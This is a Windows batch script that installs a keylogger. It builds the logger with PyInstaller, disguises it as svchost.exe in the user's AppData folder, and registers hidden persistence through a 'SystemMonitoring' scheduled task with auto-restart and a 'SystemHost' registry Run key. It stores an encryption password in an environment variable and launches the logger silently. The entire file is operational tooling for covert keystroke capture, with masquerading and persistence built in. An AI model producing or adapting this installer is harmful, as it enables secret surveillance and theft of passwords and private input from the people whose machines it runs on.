@echo off
REM Enhanced Windows installation script with auto-start and auto-restart
setlocal enabledelayedexpansion

echo ============================================
echo Windows Keylogger Auto-Start Installation
echo ============================================
echo.

REM Check for admin privileges
net session >nul 2>&1
if %errorLevel% == 0 (
    set "ADMIN_MODE=1"
    echo Running with Administrator privileges
) else (
    set "ADMIN_MODE=0"
    echo Running as regular user
)

REM Set installation paths
set "INSTALL_DIR=%APPDATA%"
set "EXECUTABLE_NAME=svchost.exe"
set "FULL_PATH=%INSTALL_DIR%\%EXECUTABLE_NAME%"

echo.
echo Step 1: Installing dependencies...
pip install pyinstaller psutil >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Failed to install dependencies
    pause
    exit /b 1
)
echo Dependencies installed successfully

echo.
echo Step 2: Building executable...
if exist "dist\svchost.exe" (
    echo Found existing executable
) else (
    echo Building new executable...
    pyinstaller keylogger.spec >nul 2>&1
    if %errorLevel% neq 0 (
        echo ERROR: Failed to build executable
        pause
        exit /b 1
    )
)

echo.
echo Step 3: Installing executable...
copy "dist\svchost.exe" "%FULL_PATH%" >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Failed to copy executable
    pause
    exit /b 1
)
echo Executable installed to: %FULL_PATH%

echo.
echo Step 4: Setting up auto-start...
echo Select installation method:
echo 1. Task Scheduler (Recommended - includes auto-restart)
echo 2. Registry Run key (Simple - no auto-restart)
echo 3. Both methods (Maximum persistence)
echo 4. Skip auto-start setup
echo.
set /p "CHOICE=Enter choice (1-4): "

if "%CHOICE%"=="1" goto :setup_task_scheduler
if "%CHOICE%"=="2" goto :setup_registry
if "%CHOICE%"=="3" goto :setup_both
if "%CHOICE%"=="4" goto :manual_start
goto :invalid_choice

:setup_task_scheduler
echo.
echo Setting up Task Scheduler entry...

REM Prepare the XML file with current username
set "TEMP_XML=%TEMP%\SystemMonitoring_temp.xml"
set "USERNAME_VAR=%USERNAME%"

REM Replace placeholders in XML
powershell -Command "(Get-Content 'SystemMonitoring.xml') -replace '%%USERNAME%%', '%USERNAME_VAR%' | Set-Content '%TEMP_XML%'"

REM Import the task
schtasks /create /tn "SystemMonitoring" /xml "%TEMP_XML%" /f >nul 2>&1
if %errorLevel% == 0 (
    echo Task Scheduler entry created successfully
    echo - Auto-start: Enabled
    echo - Auto-restart: Enabled (restarts every 1 minute if crashed)
    echo - Hidden: Yes
) else (
    echo WARNING: Failed to create Task Scheduler entry
    echo Falling back to registry method...
    goto :setup_registry_fallback
)

REM Clean up temp file
del "%TEMP_XML%" >nul 2>&1
goto :setup_complete

:setup_registry
:setup_registry_fallback
echo.
echo Setting up Registry auto-start...
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHost" /t REG_SZ /d "\"%FULL_PATH%\" --silent" /f >nul 2>&1
if %errorLevel% == 0 (
    echo Registry auto-start entry created successfully
    echo - Auto-start: Enabled
    echo - Auto-restart: Not available with this method
) else (
    echo ERROR: Failed to create registry entry
)
goto :setup_complete

:setup_both
echo.
echo Setting up both Task Scheduler and Registry methods...
call :setup_task_scheduler
call :setup_registry_fallback
goto :setup_complete

:manual_start
echo.
echo Skipping auto-start setup.
goto :setup_complete

:invalid_choice
echo Invalid choice. Please run the script again.
pause
exit /b 1

:setup_complete
echo.
echo Step 5: Setting up environment...
echo Set encryption password as environment variable? (Recommended for unattended operation)
set /p "SET_PASSWORD=Set password? (y/n): "
if /i "%SET_PASSWORD%"=="y" (
    set /p "USER_PASSWORD=Enter encryption password: "
    setx KEYLOGGER_PASSWORD "!USER_PASSWORD!" >nul 2>&1
    echo Environment variable KEYLOGGER_PASSWORD set
)

echo.
echo Step 6: Starting keylogger...
start /B "SystemMonitoring" "%FULL_PATH%" --silent
if %errorLevel% == 0 (
    echo Keylogger started successfully
) else (
    echo WARNING: Failed to start keylogger manually
)

echo.
echo ============================================
echo Installation Complete!
echo ============================================
echo.
echo Executable location: %FULL_PATH%
echo.
echo Management commands:
echo   Start manually:    start /B "%FULL_PATH%" --silent
echo   Stop:              "%FULL_PATH%" --stop
echo   Read logs:         "%FULL_PATH%" --read
echo   Check status:      tasklist /fi "imagename eq svchost.exe"
echo.
echo Task Scheduler management:
echo   View task:         schtasks /query /tn "SystemMonitoring"
echo   Disable task:      schtasks /change /tn "SystemMonitoring" /disable
echo   Delete task:       schtasks /delete /tn "SystemMonitoring" /f
echo.
echo Registry management:
echo   View entry:        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHost"
echo   Delete entry:      reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHost" /f
echo.
echo The keylogger will now start automatically when you log in.
echo If using Task Scheduler, it will also restart automatically if it crashes.
echo.
pause

goto :eof
